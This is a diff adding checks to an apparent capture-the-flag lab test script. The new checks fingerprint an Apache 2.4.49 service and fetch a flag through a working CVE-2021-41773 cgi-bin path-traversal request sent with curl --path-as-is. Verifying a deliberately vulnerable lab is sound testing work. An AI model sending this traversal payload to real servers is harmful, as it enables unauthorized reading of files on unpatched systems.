@@ -110,6 +110,14 @@ check "finger lists the users" \
 check "F7 flag in operator's .plan" \
 	sh -c "finger operator@$T | grep -q 'ISC{'"
 
+# --- F9: Apache 2.4.49 path traversal (CVE-2021-41773)
+check "8080 fingerprints as Apache 2.4.49" \
+	sh -c "nmap -sV -p 8080 $T | grep -q 'Apache httpd 2.4.49'"
+check "F9 flag via the /cgi-bin traversal" \
+	sh -c "curl -fsS --path-as-is 'http://$T:8080/cgi-bin/.%2e/.%2e/.%2e/.%2e/flag' | grep -q 'ISC{'"
+check "the traversal needs --path-as-is (curl normalises the dots)" \
+	sh -c "! curl -fsS 'http://$T:8080/cgi-bin/.%2e/.%2e/.%2e/.%2e/flag' | grep -q 'ISC{'"
+
 echo
 if (( fails )); then
 	echo "$fails test(s) FAILED"
